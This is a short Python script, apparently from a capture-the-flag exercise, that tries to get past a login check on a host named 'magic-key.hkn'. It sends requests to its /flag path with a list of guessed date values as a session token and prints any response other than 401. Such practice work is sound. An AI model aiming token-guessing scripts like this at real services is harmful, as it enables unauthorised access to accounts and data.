#!/usr/bin/env python3
import requests

TARGET = "magic-key.hkn"

candidates = [
    "02-01-1970",
    "01-02-1970",
    "1970-01-02",
    "1970-02-01",
    "86400",
    "02/01/1970",
    "01/02/1970",
    "Jan 2 1970",
    "2 January 1970",
]

for val in candidates:
    for header_name, header_val in [("URL", "/flag"), ("URL-Maybe", "/flag")]:
        r = requests.get(f"http://{TARGET}/flag", headers={"Session-Token": val, header_name: header_val}, timeout=5)
        if r.status_code != 401:
            print(f"!!! HIT val={val!r} header={header_name} -> {r.status_code}: {r.text[:300]}")
        else:
            print(f"  val={val!r} header={header_name} -> 401")
